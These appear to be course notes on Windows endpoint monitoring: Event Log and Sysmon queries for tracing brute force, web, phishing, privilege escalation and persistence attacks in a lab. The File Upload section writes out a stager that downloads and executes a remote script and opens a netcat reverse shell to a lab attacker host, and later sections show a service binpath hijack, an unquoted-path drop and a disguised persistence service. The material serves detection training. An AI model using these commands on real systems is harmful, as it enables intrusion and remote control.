# Windows Endpoint Introduction

## Command Prompt, VBScript, and Powershell

`@ECHO OFF` prevents the individual commands from displaying in the command prompt

`user_hostname.bat`

```bat
@ECHO OFF
TITLE Example Batch File
ECHO This batchfile will show Windows 10 Operating System information
systeminfo | findstr /C:"Host Name"
systeminfo | findstr /C:"OS Name"
systeminfo | findstr /C:"OS Version"
systeminfo | findstr /C:"System Type"
systeminfo | findstr /C:"Registered Owner"
PAUSE
```

`osinfo.vbs`

```vb
' List Operating System and Service Pack Information

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
 & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colOSes = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOS in colOSes
  Wscript.Echo "Computer Name: " & objOS.CSName
  Wscript.Echo "Caption: " & objOS.Caption 'Name
  Wscript.Echo "Version: " & objOS.Version 'Version & build
  Wscript.Echo "Build Number: " & objOS.BuildNumber 'Build
  Wscript.Echo "Build Type: " & objOS.BuildType
  Wscript.Echo "OS Type: " & objOS.OSType
  Wscript.Echo "Other Type Description: " & objOS.OtherTypeDescription
  WScript.Echo "Service Pack: " & objOS.ServicePackMajorVersion & "." & _
   objOS.ServicePackMinorVersion
Next
```

```bat
cscript osinfo.vbs
```

```pwsh
Get-ExecutionPolicy
Get-Help Get-CimInstance
Get-Alias gcim
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

`hostinfo.ps1`

```pwsh
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property CSName, Caption, Version,BuildNumber, BuildType, OSType, RegisteredUser, OSArchitecture, ServicePackMajorVersion, ServicePackMinorVersion

Get-Service | Where-Object { $_.Status -eq "Running" }
```

```pwsh
gcim -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Windows Event Log

Find event log files in `C:\Windows\System32\winevt\Logs`, where they are saved as `.evtx` files.

Use the built-in **Windows Event Viewer** to parse the logs.

- **Application** log includes events generated by Windows applications, such as when an application 'hangs' or is unresponsive.
- **Security** logs include authentication and other security-related activities.
- The **Setup** logs provide details about upgrade installations or replacements by Windows Update.
- The **System** logs contain native operating system behaviors that do not fit in any of the other categories, such as system restarts or the mounting of drives.

The **Application and Services Logs** provide detailed event logging of services and applications. They may be developed by Microsoft or 3rd parties who have developed their own providers and defined their own events which need to be tracked.

Each Windows event entry has a level, or **severity**:
- **Information** level indicates that the initiated activity has completed successfully.
- **Warning** level suggest that there is no immediate problem but one may arise in the future.
- **Error** and **Critical** messages both indicate failure, though Critical failures are more severe than Error-level events.

The Security logs include **Audit Success** and **Audit Failure** event levels. These can be configured in the Local Group Policy Editor, or applied from a group policy pushed from the Domain controller. They highlight all security control activity and track successes and failures.

2 major elements in the XML:
- Within the **System** element are tags such as Provider Name, EventID, and TimeCreated. The **Provider Name** indicates that the provider for **Security** logs is named **Microsoft-Windows-Security-Auditing**.
- The **EventData** elements change with every type of event that is logged.

Event ID **4624** indicates that "An account was successfully logged on".
- **TargetUserName** tag indicates that the user logged on to our Windows endpoint.
- **LogonType** tag has the value "10". LogonType 10 indicates a **RemoteInteractive** logon. RemoteInteractive refers to the use of Remote Desktop services to access the Windows machine, using the Remote Desktop Protocol (RDP). LogonType 3 indicates that a user or computer logged on to this computer from the network.
- **IpAddress** tag contains the source IP of the remote connection.

Get the details about the 4 Windows logs (LogMode, a MaximumSizeInBytes, and a RecordCount)

```pwsh
Get-WinEvent -ListLog Application, Security, Setup, System
```

```pwsh
Get-WinEvent -LogName Security | Select-Object -first 10

Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq "4624" } | Select-Object -Property TimeCreated,Message -first 10

Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime="4/23/2024 14:00:00"; EndTime="4/23/2024 14:30:00"; ID=4624} | Select-Object -Property TimeCreated,Message
```

Filter `LogonType == 10`

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2021 00:00:00"; EndTime="4/26/2021 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

Event ID **1102**: Use "Clear Log..." to clear the Security logs
Event ID **4776**: The computer attempted to validate the credentials for an account.

## Sysmon

**Sysmon** can be deployed to a Windows endpoint and create its own events as a separate provider under **Applications and Services Logs**.

Windows Event **4688** and Sysmon Event **1** are both events related to new processes being created on the system. But the Sysmon Event 1 **EventData** contains file verification **hashes** that act as a fingerprint of the file that created the process.

The configuration file for Sysmon is separated into 2 major parts including a series of **configuration entries**, (or behaviors), and **event filtering entries**, which contain rules for all 27 Sysmon event types.

- **imphash** is a clever piece of forensic data that **hashes the file's characteristics rather than the file itself**. These characteristics include the libraries used by the executable + the order in which they are stored within the file for reference.
- The **CopyOnDeletePE** tag indicates if Sysmon should make a copy of portable executables that are deleted by any user.
- The **ArchiveDirectory** tag represents the directory path (from the root of the C drive) where deleted copies should be stored.

The **group relation** of OR to make each rule independent.

With respect to the previous rule group, a network connection matching those ports (8080, 443) can be ignored if they were initiated by either the Chrome or Edge web browsers.

`https://github.com/Neo23x0/sysmon-config`

`sysmonconfig-export.xml`

```xml
<Sysmon schemaversion="3.2">
  <HashAlgorithms>MD5,SHA256,IMPHASH</HashAlgorithms>
  <CopyOnDeletePE>True</CopyOnDeletePE>
  <ArchiveDirectory>BackupDeleted</ArchiveDirectory>
 <EventFiltering>
  <RuleGroup name="Process Rules" groupRelation="or">
    <ProcessCreate onmatch="exclude">
      <Image condition="is">C:\Program Files\Windows Media Player\wmplayer.exe</Image>
      <Image condition="is">C:\Windows\system32\powercfg.exe</Image>
  </RuleGroup>
  <RuleGroup name="Driver Rules" groupRelation="or">
    <Driverload onmatch="exclude">
      <Signature condition="begin with">AMD</Signature>
      <Signature condition="contains">microsoft</Signature>
      <Signature condition="contains">windows</Signature>
  </RuleGroup>
  <RuleGroup name="Network Process Rules" groupRelation="or">
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">Chrome.exe</Image>
      <Image condition="end with">msedge.exe</Image>
    </NetworkConnect>
  </RuleGroup>
  <RuleGroup name="Network Port Rules" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">8080</DestinationPort>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Dump the current configuration (confirms that Sysmon is installed and running)

```pwsh
.\Sysmon64.exe -c | Select-Object -first 10
```

Reconfigure an active Sysmon with a configuration file

```pwsh
.\Sysmon64.exe -c C:\sysmonconfig-export.xml
```

Example sysmon configuration file:

```xml
  <RuleGroup name="" groupRelation="or">
    <FileCreate onmatch="include">
    ...
      <TargetFilename condition="end with">.bat</TargetFilename>
    ...
```

```
"Test" | Out-File FileCreate.bat
```

Sysmon events are stored in **Applications and Services Logs/Microsoft/Windows/Sysmon/Operational**

```pwsh
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"
```

`Import-Module C:\Sysmon\Get-Sysmon.psm1`

```pwsh
function Get-SysmonEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-Sysmon/Operational"}

    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }

    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

```pwsh
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

We don't need to specify an Event ID

```pwsh
Get-SysmonEvent $null "04/28/2021 13:55:00" "04/28/2021 14:00:00"
```

Search for a **FileCreate** event (Sysmon Event ID 11)

```pwsh
Get-SysmonEvent 11 "4/28/2021 13:48:00" "4/28/2021 13:49:00" | Format-List
```

Search for a **ProcessCreate** event (Sysmon Event ID 1), filter out the ProcessId 2032

```pwsh
Get-SysmonEvent 1 $null "7/28/2021 13:48:42" | Where-Object { $_.properties[3].value -eq 2032 } | Format-List
```

## Remote Access with PowerShell Core

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.51.50

ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null offsec@192.168.51.12
```

```pwsh
Enter-PSSession 192.168.51.10 -Credential offsec -Authentication Negotiate
```

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /u:offsec /p:lab /v:192.168.51.10
```

# Windows Server Side Attacks

## Credential Abuse

### Suspicious Logins

Search for Logon events (Event ID **4624**) occurring over the course of 2 days where it is expected that no users will be logged in (such as a weekend).

**LogonType** 10 indicates a RemoteInteractive logon (the use of Remote Desktop services to access the Windows machine, using the RDP)

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2024 19:00:00"; EndTime="4/26/2024 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

`Import-Module C:\Sysmon\Get-Security.psm1`

```pwsh
function Get-SecurityEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Security"}

    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

Search for a **logoff** event (Event ID **4634**) where the **Logon ID** is 0x323466

```pwsh
Get-SecurityEvent 4634 "5/1/2021 03:21:26" "5/3/2021 07:00:00" | Where-Object { $_.properties[3].value -eq 0x323466 } | Format-List
```

### Brute-Force Logins

Get a list of all **failed Logon** events (Event ID **4625**) that occurred in the span of a single day

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00"
```

**LogonType** 3 indicates a network-based logon. hydra uses Network-Level Authentication (NLA). NLA forces an authentication to take place before the RDP session is initiated.

The **Status** code C000006D indicates that the failure is due to a bad username or authentication information. Other error codes specify that the username is nonexistent or that the password was incorrect.

Since we have NLA enabled, look at the **SubStatus** code C000006A to determine the details. Both the Status and Substatus explain the authentication failure.

If we suspect logons are indicative of a brute force credential attack, extract Target User Name, Status, SubStatus, Logon Type, Workstation Name, and IP Address.

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00" | Format-List TimeCreated, @{Label = "Logon Type"; Expression = {$_.properties[10].value}}, @{Label = "Status"; Expression = {'{0:X8}' -f $_.properties[7].value}}, @{Label = "Substatus"; Expression = {'{0:X8}' -f $_.properties[9].value}}, @{Label = "Target User Name"; Expression = {$_.properties[5].value}}, @{Label = "Workstation Name"; Expression = {$_.properties[13].value}}, @{Label = "IP Address"; Expression = {$_.properties[19].value}}
```

Search for successful authentications from that IP in this time frame:

```pwsh
Get-SecurityEvent 4624 "5/6/2021 09:36:44" "5/6/2021 09:37:44" | Where-Object { $_.properties[18].value -eq "192.168.51.50" }
```

Event ID **4801**: A workstation being locked or workstation being unlocked.
**LogonType** 7: This workstation was unlocked.


## Web Application Attacks

IIS has a built-in logging mechanism that logs to `C:\inetpub\logs\LogFiles`. E.g. `C:\inetpub\logs\LogFiles\W3SVC1\u_ex210506.log.`

List the log files for the 1st instance (or site ID) of W3SVC1:

```pwsh
dir C:\inetpub\logs\LogFiles\W3SVC1
```

Any additional web service instances hosted by IIS would log under sequentially-numbered directories, such as W3SVC2, W3SVC3, etc.

Each log file begins with `u_ex` followed by a date code formatted as YYMMDD.


### Local File Inclusion

### Command Injection

The IIS log file reveals an HTTP POST to the vulnerable PATH used by the exploit. We don't see the POSTDATA in IIS logs, but we can confirm a direct attempt at posting data to this page at this particular time from 192.168.51.50. **Over 3700 milliseconds elapsed while executing the query**. If we had a baseline of 200-400 milliseconds for the amount of time this normally takes

=> A greater source of suspicion for anomalous activity.

Get any and all Sysmon events

```pwsh
Get-SysmonEvent $null "05/10/2021 16:02:00" "5/10/2021 16:03:00"
```

Search for Sysmon's ProcessCreate events

```pwsh
Get-SysmonEvent 1 "05/10/2021 16:02:33" "5/10/2021 16:02:35" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

When chaining processes with parent processes, use the process/parent process IDs located in the ProcessCreate events.

When anomalous activity is identified, trace from parent to parent until we find the origin of the activity.

### File Upload

`stage.bat`

```bat
@ECHO OFF
powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.51.50:8000/load.ps1')"
```

`load.ps1`

```pwsh
del stage.bat
wget http://192.168.51.50:8000/nc.exe -O /Windows/Temp/nc.exe
/Windows/Temp/nc.exe 192.168.51.50 4444 -e cmd.exe
```

=> Tracking the upload and execution of our `stage.bat` and `load.ps1` scripts

Since our IIS logs showed activity at 2:26:17 PM, query on all Sysmon events from 2:26 PM to 2:27 PM

```pwsh
Get-SysmonEvent $null "05/13/2021 14:26:00" "5/13/2021 14:27:00"
```

Gather all **ProcessCreate** events that occurred at the 17s mark. => 2 command injections downloading and running `stage.bat`.

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

There were 2 **FileCreate** events in the same timeframe.

- `stage.bat` being written via `certutil.exe`.

- A PowerShell script in `C:\Windows\Temp` is an artifact of using `Invoke-Expression` to read in a PowerShell script.

```pwsh
Get-SysmonEvent 11 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List @{Label = "Rule"; Expression = {$_.properties[0].value}}, @{Label = "PID"; Expression = {$_.properties[3].value}},@{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "TargetFile"; Expression = {$_.properties[5].value}}
```

We have the PID for PowerShell (6784).

Any **ProcessCreate** events with this PID can be traced back to this event => extract the Process ID (PID) and the Parent Process ID (PPID):

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:17" "5/13/2021 14:26:19" | Format-List TimeCreated, @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "PPID"; Expression = {$_.properties[19].value}}, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

Search for NetworkConnect events

```pwsh
Get-SysmonEvent 3 "5/13/2021 2:26:18" "5/13/2021 2:26:20" | Format-List @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "User"; Expression = {$_.properties[5].value}}, @{Label = "Source IP"; Expression = {$_.properties[9].value}}, @{Label = "Source Port"; Expression = {$_.properties[11].value}}, @{Label = "Destination IP"; Expression = {$_.properties[14].value}}, @{Label = "Destination Port"; Expression = {$_.properties[16].value}}
```

### Binary Attacks

```pwsh
Start-Service -Name "Sync Breeze Enterprise"
Get-Service -Name "Sync Breeze Enterprise" | Format-List -Property Status,Name,DisplayName
```

ProcessCreate event: A **command prompt** was initiated by `syncbrs.exe`. The User field indicates that the **SYSTEM** user started the command prompt.

NetworkConnect events: connections from our attacker machine to SyncBreeze on port 8080. The reverse shell also left traces as it called back to our Kali VM on port 4444.


### Windows Defender Exploit Guard (WDEG)

Windows Defender Exploit Guard (WDEG) is disabled by default. It was developed to address file-less malware attacks, or malware that operates almost exclusively in memory.

WDEG has 4 major components:
1. **Attack Surface Reduction** (ASR) addresses file-less malware attacks that hide within Microsoft Office documents. ASR can also block executable content or network communications from Adobe Reader, VBScript, and JavaScript.

2. **Controlled folder access**: prevent applications from writing or making changes to directories specified by policy (Modern ransomware often maliciously encrypts user data). By default, the home directory of users (C:\Users\<user account>) are protected.

3. **Network protection** relies on Microsoft's Intelligent Security Graph as a threat intelligence resource for domain and IP reputation. Anything less-than-reputable can be halted independently of what process or application initiated it.

4. **Exploit protection**: Administrators must import an XML configuration file to set this up.

=> Create a rule to enact Data Execution Prevention (DEP) for SyncBreeze to render the exploit inoperable. Rules can be created through the Windows GUI, by importing an XML Configuration, or with PowerShell.

Validate API Invocation (or **CallerCheck**) is a protection mechanism that watches how API calls are invoked. This control will only allow functions to be accessed with a **call** assembly instruction, rather than a **return** instruction.

Using return instructions to execute API calls is known as Return-Oriented Programming (ROP) and is used to bypass data execution prevention.

Enable exploit protection for a specific process (The exploit will fail)

```pwsh
Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable EnableRopCallerCheck

Get-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe'

Restart-Service -Name "Sync Breeze Enterprise"
```

The event that is generated will not appear in Windows Security event logs, but rather in the **Security-Mitigations** logs.

```pwsh
Get-WinEvent -FilterHashTable @{LogName = 'Microsoft-Windows-Security-Mitigations/UserMode'; StartTime = '5/25/2021 13:42:28'; EndTime = '5/25/2021 13:42:30'} | Format-List -Property Id, TimeCreated, LevelDisplayName, Message
```

Turn auditing on for Windows exploit protection. (should not block the activity but still generate events.)
- Remove our SyncBreeze configuration
- Reconfigure our exploit protections to only audit the return-oriented API calls used by the SyncBreeze exploit.

```pwsh
Remove-Item -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\syncbrs.exe'

Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable AuditEnableRopCallerCheck

Restart-Service -Name "Sync Breeze Enterprise"
```

# Windows Client Side Attacks

Query for the ProcessCreate event: PowerShell was started with a base64-encoded payload. The CommandLine field shows the abbr. payload as executed on the command line. The Parent Process ID belongs to Microsoft Word, and the ParentCommandLine reveals the Word document `Engineer_Resume.doc`.

```pwsh
Get-SysmonEvent 1 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
```

Query for the FileCreate event: A temporary PowerShell file is written to `C:\Users\offsec\AppData\Local\Temp`

```pwsh
Get-SysmonEvent 11 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
```

Query for the **DNSEvent** created by our attachnment (Event ID 22)

```pwsh
Get-SysmonEvent 22 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Format-List
```

2 NetworkConnect events: filter on the destination IP `192.168.51.50` (PowerShell is initiating separate network sessions as a result of the two-stage malware infection)

```pwsh
Get-SysmonEvent 3 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

## PowerShell Logging

3 different types of PowerShell logging: Module, Script Block, and Transcription.

Launch the **Local Group Policy Editor**, gpedit.msc, and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`

### PowerShell Module Logging

Change the setting `Turn on Module Logging` from Not Configured to Enabled.

This also activates the **Show...** button next to **Module Names** > specify what modules this policy needs to log.

Rather than list out every possible module, enter a wildcard ("*") character so that we can log all PowerShell modules.

Collect information on all currently running processes

```pwsh
Get-WmiObject -Class Win32_Process | Format-Table ProcessId, ParentProcessId, Name; Write-Host (Get-Date)
```

Event ID for pipeline execution events enabled by module logging is **4103**.

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="6/14/2021 13:25:52"; EndTime="6/14/2021 13:25:54"; ID=4103} | Format-List
```

- Command Name indicates which cmdlet initiated this pipeline execution. Or the Script Name.
- Sequence Number tracks the order in which PowerShell events execute.
- Pipeline ID tracks commands within a given pipeline.

We could trace an entire series of PowerShell commands using the Pipeline ID, and order them based on the Sequence Number.


### PowerShell Script Block Logging

Open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.

Change the setting `Turn on PowerShell Script Block Logging` from Not Configured to Enabled.

Uncheck the option to **Log script block execution start / stop events**.

The use of script block logging to help with the **deobfuscation** of PowerShell commands.

```pwsh
{ "This is a script block" }; Write-Host (Get-Date)
```

The Event ID for remote command execution events enabled by script block logging is **4104**.

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="06/15/2021 14:49:42"; EndTime="06/15/2021 14:49:44"; ID=4104} | Format-List
```

Use PowerShell to encode a command

```pwsh
$Command = 'Write-Host (Get-Date); Get-Hotfix'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
$EncodedCommand
```

```pwsh
powershell -Encoded <$EncodedCommand>
```

### PowerShell Transcription

PowerShell transcription will generate full records of a PowerShell session, with all input and output stored in a text file.

To enable transcription for PowerShell, open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.

Change the setting **Turn on Powershell Transcription** from Not Configured to Enabled.

Also select the checkbox for **Include Evocation Headers** so that timestamps are produced for each command in our transcripts.

navigate to the `C:\Users\offsec\Documents\YYYYMMDD` directory, we'll find a text file titled `PowerShell_transcript.HOSTNAME.UNIQUEID.YYYYMMDDHHMMSS.txt`

### Case Study: Phishing Attacks

`Import-Module C:\Sysmon\Get-PSLog.psm1`

```pwsh
function Get-PSLogEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-PowerShell/Operational"}

    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }

    Get-WinEvent -FilterHashtable $filters
}
```

```pwsh
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table Timecreated, LevelDisplayName, Message
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
```

```pwsh
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table TimeCreated, LevelDisplayName, Message
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
```

Extracting the Payload from Each Module Log Event Message

```pwsh
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:44:59" | Format-List TimeCreated, @{Label = "Payload"; Expression = {$_.properties[2].value}}
```

Obfuscate a PowerShell command

```pwsh
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Choose Ticks as our obfuscation technique for the command tokens.
Arguments can also be obfuscated using random case, concatenation of strings, and **reordering** the text altogether

```
SET SCRIPTBLOCK Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)
back
show
```

CommandLineSyntax:

```pwsh
Invoke-Obfuscation -ScriptBlock {Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)} -Command 'Token\Command\1,Token\Argument\4' -Quiet
```

Query script block events => the obfuscation makes it harder for us to understand what's happening

```pwsh
Get-PSLogEvent 4104 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
```

Query module log events within the same time range

```pwsh
Get-PSLogEvent 4103 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
```

Use **Revoke-Obfuscation** (`https://github.com/danielbohannon/Revoke-Obfuscation`) to detect obfuscated PowerShell commands and scripts. In some cases, it can even help reconstruct an obfuscated PowerShell script that has been executed.

```pwsh
Import-Module C:\tools\windows_client_side_attacks\Revoke-Obfuscation\Revoke-Obfuscation.psm1
```

To export PowerShell logs from the command line, use **wevtutil**, a command-line utility for listing and saving event logs in an XML-based event file format (`.evtx`).

```pwsh
wevtutil export-log Microsoft-Windows-PowerShell/Operational C:\users\offsec\Desktop\pwsh_export.evtx
```

Reassemble script blocks from script block (ID: 4104) events

```pwsh
Get-RvoScriptBlock -Path 'C:\Users\offsec\Desktop\pwsh_export.evtx' -Verbose
```

# Windows Privilege Escalation

```pwsh
.\accesschk64.exe -uws "Everyone" "C:\Program Files (x86)\"
```

```pwsh
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Format-List
```

## Bypassing UAC

Output the modify registry events, whose IDs are equal to **13**.

```pwsh
Get-SysmonEvent 13 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
```

ProcessCreate events

```pwsh
Get-SysmonEvent 1 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
```

Query the PowerShell module log entries

```pwsh
Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45"
Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45" | Format-List
```

Use the `Where-Object` cmdlet on the **Image** field containing the string "fodshell"

```pwsh
Get-SysmonEvent 1 "06/28/2021 13:41:00" "06/28/2021 13:42:00" | Where-Object { $_.properties[4].value -like "*fodshell*" } | Format-List
```

## Escalating to SYSTEM

### Service Creation

Use Windows services and named pipes to escalate privileges (Meterpreter getsystem command)

Event with ID 4697: A service was installed in the system

```pwsh
Get-SecurityEvent 4697 "6/30/2021 12:49:31" "6/30/2021 12:49:33" | Format-List
```

Display RegistryEvent entries

```pwsh
Get-SysmonEvent 13 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
```

1. writes 0x00000003 to the Start key of the hvaukz service. This sets the new service to a **Manual** start-up, rather than when the system boots.
2. sets the **ImagePath** key of the **hvaukz** service to the named pipe.
3. changes the value of the Start key for the hvaukz service. The value 0x00000004 indicates that the service will be changed from Manual to **Disabled**.

```pwsh
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\hvaukz
```

View the ProcessCreate event

```pwsh
Get-SysmonEvent 1 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
```

### Attacking Service Permissions

When querying services with Service Control in PowerShell, use the `sc.exe` filename and not just `sc`.

The `Set-Content` cmdlet in PowerShell can be abbreviated with `sc`, and the PowerShell prompt prioritizes cmdlets over Windows commands.

```pwsh
sc.exe qc Serviio
```

Enumerate the permissions of installed services

* -c argument to specify a Windows Service by name, the wildcard * to query all Windows services
* -l for the full security descriptor

```pwsh
.\accesschk64.exe -c Serviio -l
```

```pwsh
C:\Windows\system32\sc.exe config Serviio binpath= 'C:\tools\servshell_443.exe'
net start serviio
```

Examine the ProcessCreate event (sc.exe made the configuration change)

```pwsh
Get-SysmonEvent 1 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
```

Review the RegistryEvent entry (HKLM\System\CurrentControlSet\Services\Serviio\ImagePath Windows Registry key is changed)

```pwsh
Get-SysmonEvent 13 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
```

```pwsh
Get-SysmonEvent 1 "7/1/2021 10:56:09" "7/1/2021 10:56:11" | Format-List @{ Label = 'UtcTime'; Expression = { $_.properties[1].value }}, @{ Label = 'Image'; Expression = { $_.properties[4].value }}, @{ Label = 'ProcessId'; Expression = { $_.properties[3].value }}, @{ Label = 'CommandLine'; Expression = { $_.properties[10].value }}, @{Label = 'User'; Expression = { $_.properties[12].value }}, @{ Label = 'ParentImage'; Expression = { $_.properties[20].value }}, @{ Label = 'ParentProcessId'; Expression = { $_.properties[19].value }}
```

### Leveraging Unquoted Service Paths

```pwsh
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

```pwsh
sc.exe qc IOBitUnSvr
...
BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

```pwsh
copy .\servshell_443.exe 'C:\Program Files (x86)\IObit\IOBit.exe'
shutdown -r -t 0
```

FileCreate events

```pwsh
Get-SysmonEvent 11 "7/8/2021 10:49:33" "7/8/2021 10:49:35" | Format-List
```

Search across all ProcessCreate events where the Image field contains the wildcarded filename `IOBit.exe`

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*IOBit.exe*" } | Format-List
```

# Windows Persistence

## Persistence on Disk

### Persisting via Windows Service

Creates a new service named "VindowsUpdate".
- (start= auto) indicates that the service should start after the operating system boots, even if no users have logged on.
- error= ignore parameter indicates that service errors are logged without notifying the user or interrupting system startup.
- binpath= C:\tools\windows_persistence\prst_servshell443.exe" details the location of the binary.

```pwsh
sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
shutdown -r -t 0
```

Query all events in the Security log

```pwsh
Get-SecurityEvent $null "10/29/2021 11:43:00" "10/29/2021 11:44:00" | Format-List
```

An event entry (Event Id 4697) indicating that a service was installed in the system.

Note that `prst_servshell443.exe` was on the target already. Attackers trying to create their own service will often upload their preferred service binary first. => search for **FileCreate** events.

1 ProcessCreate event (`sc.exe`) and 2 RegistryEvent entries.

```pwsh
Get-SysmonEvent 1 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
```

```pwsh
Get-SysmonEvent 13 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
```

The Service Control Manager (`services.exe`) has added new values in the `HKEY_LOCAL_MACHINE` (HKLM) hive.

- The **Start** value created in the **VindowsUpdate** key. The Start value contains a single DWORD for the **Startup** type. The 32-bit value of "2" represents the **AUTO** Startup type that we set for this service.

- The **ImagePath** value of our service configuration, which is the full path to `prst_servshell443.exe`.


Filter on ProcessCreate events where the Image field contains the filename `prst_servshell443.exe`

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*prst_servshell443.exe*" } | Format-List
```

Find any other ProcessCreate events where the ParentProcessId (PPID) matches the ProcessId of prst_servshell443.exe (3140)

```pwsh
Get-SysmonEvent 1 "10/29/2021 12:33:41" | Where-Object { $_.properties[19].value -eq 3140 } | Format-List
```

